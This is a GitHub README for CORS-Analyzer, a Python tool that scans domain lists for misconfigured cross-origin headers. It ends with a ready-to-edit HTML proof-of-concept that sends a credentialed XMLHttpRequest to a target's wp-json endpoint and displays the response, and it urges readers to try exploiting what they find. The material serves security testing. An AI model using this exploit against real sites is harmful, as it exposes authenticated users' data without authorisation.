# CORS-Analyzer
## This tools is developed for identifying the vulnerable cors domain

![alt text](https://raw.githubusercontent.com/hariharan005/CORS/main/lib/banner/cors-analyzer.png)

### How to install CORS-Analyzer:
```
git clone https://github.com/hariharan005/CORS.git     
ls    
cd CORS
sudo pip3 install -r requirements.txt 
cd lib && chmod +x cors.py
sudo ln -s "$(pwd)/cors.py" /usr/local/bin/cors-analyzer 
cors-analyzer
```
Now type "cors-analyzer" to access the CORS analyzer tool from anywhere

### How to install using pip:

```
For first time installation use the following command,
    pip install cors-analyzer

If you want to install the latest version of CORS-Analyzer just uninstall the old version using the following command,
    pip uninstall cors-analyzer
    pip install --upgrade cors-analyzer

For upgrade, use the following command,
    pip install --upgrade cors-analyzer

For ignore the cache, use the following command,
    pip install --ignore-cache cors-analyzer
```
### Python Version:
* Python 3 (3.x.x) latest version

### How to Use CORS-Finder:

```
For scanning:
       cat <domain.txt> | xargs -n1 -P10 python3 corss.py                           
For scanning with output:  
       cat <domain.txt> | xargs -n1 -P10 python3 corss.py | tee -a <output.txt>
```

### When its vulnerable:
If the header returns the 
       Access-Control-Allow-Origin: https://vulnerable.com/
       Access-Control-Allow-Credentials: true
       its vulnerable

Note: Not all the time its seems vulnerable, you have to check with cors payload and in the authenticated manner also. Try to exploit and this tool is only for indentifying the vulnerable domain

Note: In this tool i used sample domain file but you have to choose your own url file which you recon using some other recon tool.


### Exploitation examples:

Here is the Example code for exploiting the CORS misconfiguration:

Goto this line and replace the URL xhr.open("GET", "https://www.vulnerable.com/blog/wp-json/", true);

```
<!DOCTYPE html>
<html>
    <title>Cors POC</title>
    <style>
        body{
            background-color: white;
            justify-content: center;
        }
        button{
            justify-content: center;
            align-items: center;
            color: white;
            border-radius: 8px;
            font-size: 18px;
            background-color: #6437A0;
            position: relative;
            width: 10%;
            height: 50px;
            display: grid;
        }
    </style>
     <body>
         <h1>CORS PoC by @crypto_grapper_</h1><span><h2>Hariharan.C</h2></span>
         <div id="demo">
                <button type="button" onclick="cors()" >Wp-json Exploit</button>
            </div>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
             xhr.open("GET", "https://www.vulnerable.com/blog/wp-json/", true);
             xhr.withCredentials = true;
             xhr.send();
             }
             setTimeout(() => {
                document.location.reload("#");
             }, 5000);
         </script>
     </body>
 </html>
```